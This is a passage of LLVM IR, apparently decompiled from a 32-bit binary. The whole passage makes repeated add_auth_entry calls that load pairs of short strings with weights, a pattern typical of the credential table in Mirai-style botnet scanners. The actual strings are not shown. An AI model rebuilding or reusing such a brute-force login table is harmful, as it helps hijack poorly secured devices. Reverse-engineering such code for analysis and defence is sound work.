  store i32 ptrtoint ([6 x i8]* @global_var_182ac.248 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d8a0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([6 x i8]* @global_var_182ac.248 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_182b4.250 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_d8b0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([4 x i8]* @global_var_182b4.250 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182b8.252 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d8c0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_182b8.252 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182c0.254 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_d8d0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_182c0.254 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_182cc.256 to i32), i32* %r1.global-to-local, align 4
  %v0_d8dc = load i32, i32* @r4, align 4
  store i32 %v0_d8dc, i32* %r2.global-to-local, align 4
  %v5_d8e0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_182cc.256 to i32), i32 %v0_d8dc)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_182d4.258 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_d8f0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([9 x i8]* @global_var_182d4.258 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182e0.260 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_d900 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_182e0.260 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182e8.262 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d910 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_182e8.262 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182f0.264 to i32), i32* %r1.global-to-local, align 4
  %v0_d91c = load i32, i32* @r4, align 4
  store i32 %v0_d91c, i32* %r2.global-to-local, align 4
  %v4_d920 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_182f0.264 to i32), i32 %v0_d91c)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182f8.266 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_d930 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_182f8.266 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18300.268 to i32), i32* %r1.global-to-local, align 4
  %v0_d93c = load i32, i32* @r4, align 4
  store i32 %v0_d93c, i32* %r2.global-to-local, align 4
  %v5_d940 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_18300.268 to i32), i32 %v0_d93c)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18308.270 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_d950 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([8 x i8]* @global_var_18308.270 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18310.272 to i32), i32* %r1.global-to-local, align 4
  %v0_d95c = load i32, i32* @r4, align 4
  store i32 %v0_d95c, i32* %r2.global-to-local, align 4
  %v4_d960 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_18310.272 to i32), i32 %v0_d95c)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_181b4.196 to i32), i32* %r1.global-to-local, align 4
  %v0_d96c = load i32, i32* @r4, align 4
  store i32 %v0_d96c, i32* %r2.global-to-local, align 4
  %v5_d970 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_181b4.196 to i32), i32 %v0_d96c)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18318.274 to i32), i32* %r1.global-to-local, align 4
  %v0_d97c = load i32, i32* @r4, align 4
  store i32 %v0_d97c, i32* %r2.global-to-local, align 4
  %v4_d980 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_18318.274 to i32), i32 %v0_d97c)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18320.276 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_d990 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_18320.276 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18328.278 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_d9a0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([9 x i8]* @global_var_18328.278 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18334.280 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18334.280 to i32), i32* %r1.global-to-local, align 4
  %v5_d9b0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18334.280 to i32), i32 ptrtoint ([6 x i8]* @global_var_18334.280 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1812c.244 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1812c.244 to i32), i32* %r1.global-to-local, align 4
  %v5_d9c0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1812c.244 to i32), i32 ptrtoint ([5 x i8]* @global_var_1812c.244 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1812c.244 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d9d0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1812c.244 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1842c.282 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_d9e0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_1842c.282 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1833c.284 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_d9f0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_1833c.284 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18344.286 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_da00 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18344.286 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_18344.286 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18344.286 to i32), i32* %r1.global-to-local, align 4
  %v5_da10 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18344.286 to i32), i32 ptrtoint ([8 x i8]* @global_var_18344.286 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_1834c.288 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_da20 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_1834c.288 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 3)
  store i32 ptrtoint ([8 x i8]* @global_var_18350.290 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18358.292 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_da30 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18350.290 to i32), i32 ptrtoint ([7 x i8]* @global_var_18358.292 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_18360.294 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_18360.294 to i32), i32* %r1.global-to-local, align 4
  %v5_da40 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_18360.294 to i32), i32 ptrtoint ([4 x i8]* @global_var_18360.294 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18364.296 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_da50 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18364.296 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18370.298 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_da60 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_18370.298 to i32), i32 4)
  store i32 ptrtoint ([7 x i8]* @global_var_18378.300 to i32), i32* %r0.global-to-local, align 4
  %v0_da68 = load i32, i32* @r4, align 4
  store i32 %v0_da68, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18378.300 to i32), i32* %r1.global-to-local, align 4
  %v5_da70 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_18378.300 to i32), i32 ptrtoint ([7 x i8]* @global_var_18378.300 to i32), i32 %v0_da68)
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18378.300 to i32), i32* %r1.global-to-local, align 4
  %v0_da7c = load i32, i32* @r4, align 4
  store i32 %v0_da7c, i32* %r2.global-to-local, align 4
  %v4_da80 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 ptrtoint ([7 x i8]* @global_var_18378.300 to i32), i32 %v0_da7c)
  store i32 ptrtoint (i32* @global_var_18380.302 to i32), i32* %r0.global-to-local, align 4
  %v0_da88 = load i32, i32* @r4, align 4
  store i32 %v0_da88, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18380.302 to i32), i32* %r1.global-to-local, align 4
  %v3_da90 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18380.302 to i32), i32 ptrtoint (i32* @global_var_18380.302 to i32), i32 %v0_da88)
  store i32 ptrtoint ([6 x i8]* @global_var_18388.304 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18120.160 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_daa0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18388.304 to i32), i32 ptrtoint ([8 x i8]* @global_var_18120.160 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_18390.306 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_dab0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18390.306 to i32), i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18390.306 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18168.178 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_dac0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18390.306 to i32), i32 ptrtoint ([5 x i8]* @global_var_18168.178 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18390.306 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_dad0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18390.306 to i32), i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 5)
  store i32 ptrtoint (i32* @global_var_18398.308 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v3_dae0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18398.308 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 5)
  store i32 ptrtoint ([9 x i8]* @global_var_183a0.310 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_183ac.312 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_daf0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_183a0.310 to i32), i32 ptrtoint ([7 x i8]* @global_var_183ac.312 to i32), i32 8)
  store i32 ptrtoint ([8 x i8]* @global_var_183b4.314 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_183b4.314 to i32), i32* %r1.global-to-local, align 4
  %v5_db00 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_183b4.314 to i32), i32 ptrtoint ([8 x i8]* @global_var_183b4.314 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_183bc.316 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_183bc.316 to i32), i32* %r1.global-to-local, align 4
  %v5_db10 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_183bc.316 to i32), i32 ptrtoint ([7 x i8]* @global_var_183bc.316 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_183bc.316 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_183c4.318 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_db20 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_183bc.316 to i32), i32 ptrtoint ([8 x i8]* @global_var_183c4.318 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_183cc.320 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_183d4.322 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_db30 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_183cc.320 to i32), i32 ptrtoint ([10 x i8]* @global_var_183d4.322 to i32), i32 9)
  store i32 ptrtoint ([6 x i8]* @global_var_183cc.320 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18320.276 to i32), i32* %r1.global-to-local, align 4
  %v0_db3c = load i32, i32* @r4, align 4
  store i32 %v0_db3c, i32* %r2.global-to-local, align 4
  %v5_db40 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_183cc.320 to i32), i32 ptrtoint ([7 x i8]* @global_var_18320.276 to i32), i32 %v0_db3c)
  store i32 ptrtoint ([5 x i8]* @global_var_183e0.324 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_183e0.324 to i32), i32* %r1.global-to-local, align 4
  %v5_db50 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_183e0.324 to i32), i32 ptrtoint ([5 x i8]* @global_var_183e0.324 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_183e8.326 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_183f0.328 to i32), i32* %r1.global-to-local, align 4
  %v0_db5c = load i32, i32* @r4, align 4
  store i32 %v0_db5c, i32* %r2.global-to-local, align 4
  %v5_db60 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_183e8.326 to i32), i32 ptrtoint ([7 x i8]* @global_var_183f0.328 to i32), i32 %v0_db5c)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_183f0.328 to i32), i32* %r1.global-to-local, align 4
  %v0_db6c = load i32, i32* @r4, align 4
  store i32 %v0_db6c, i32* %r2.global-to-local, align 4
  %v5_db70 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([7 x i8]* @global_var_183f0.328 to i32), i32 %v0_db6c)
  store i32 ptrtoint ([3 x i8]* @global_var_183c0.330 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_183f8.332 to i32), i32* %r1.global-to-local, align 4
  %v0_db7c = load i32, i32* @r4, align 4
  store i32 %v0_db7c, i32* %r2.global-to-local, align 4
  %v5_db80 = call i32 @add_auth_entry(i32 ptrtoint ([3 x i8]* @global_var_183c0.330 to i32), i32 ptrtoint ([7 x i8]* @global_var_183f8.332 to i32), i32 %v0_db7c)
  store i32 ptrtoint ([7 x i8]* @global_var_183f8.332 to i32), i32* %r0.global-to-local, align 4
  %v0_db88 = load i32, i32* @r4, align 4
  store i32 %v0_db88, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_183f8.332 to i32), i32* %r1.global-to-local, align 4
  %v5_db90 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_183f8.332 to i32), i32 ptrtoint ([7 x i8]* @global_var_183f8.332 to i32), i32 %v0_db88)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18400.334 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_dba0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint (i32* @global_var_18400.334 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18400.334 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_dbb0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18400.334 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1840c.336 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_dbc0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([5 x i8]* @global_var_1840c.336 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18414.338 to i32), i32* %r1.global-to-local, align 4
  %v0_dbcc = load i32, i32* @r4, align 4
  store i32 %v0_dbcc, i32* %r2.global-to-local, align 4
  %v5_dbd0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([7 x i8]* @global_var_18414.338 to i32), i32 %v0_dbcc)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1841c.340 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_dbe0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_1841c.340 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18428.342 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_dbf0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18428.342 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18430.344 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_dc00 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18430.344 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1843c.346 to i32), i32* %r1.global-to-local, align 4
  %v0_dc0c = load i32, i32* @r4, align 4
  store i32 %v0_dc0c, i32* %r2.global-to-local, align 4
  %v4_dc10 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_1843c.346 to i32), i32 %v0_dc0c)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18444.348 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_dc20 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18444.348 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18450.350 to i32), i32* %r1.global-to-local, align 4
  %v0_dc2c = load i32, i32* @r4, align 4
  store i32 %v0_dc2c, i32* %r2.global-to-local, align 4
  %v4_dc30 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18450.350 to i32), i32 %v0_dc2c)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18458.352 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_dc40 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18458.352 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18460.354 to i32), i32* %r1.global-to-local, align 4
  %v0_dc4c = load i32, i32* @r4, align 4
  store i32 %v0_dc4c, i32* %r2.global-to-local, align 4
  %v5_dc50 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([7 x i8]* @global_var_18460.354 to i32), i32 %v0_dc4c)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18468.356 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_dc60 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18468.356 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18470.358 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_dc70 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_18470.358 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1847c.360 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_dc80 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint ([9 x i8]* @global_var_1847c.360 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18488.362 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_dc90 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 ptrtoint ([6 x i8]* @global_var_18488.362 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18488.362 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18488.362 to i32), i32* %r1.global-to-local, align 4
  %v5_dca0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18488.362 to i32), i32 ptrtoint ([6 x i8]* @global_var_18488.362 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_18490.364 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18490.364 to i32), i32* %r1.global-to-local, align 4
  %v5_dcb0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18490.364 to i32), i32 ptrtoint ([8 x i8]* @global_var_18490.364 to i32), i32 7)
  store i32 ptrtoint (i32* @global_var_18498.366 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_181b4.196 to i32), i32* %r1.global-to-local, align 4
  %v0_dcbc = load i32, i32* @r4, align 4
  store i32 %v0_dcbc, i32* %r2.global-to-local, align 4
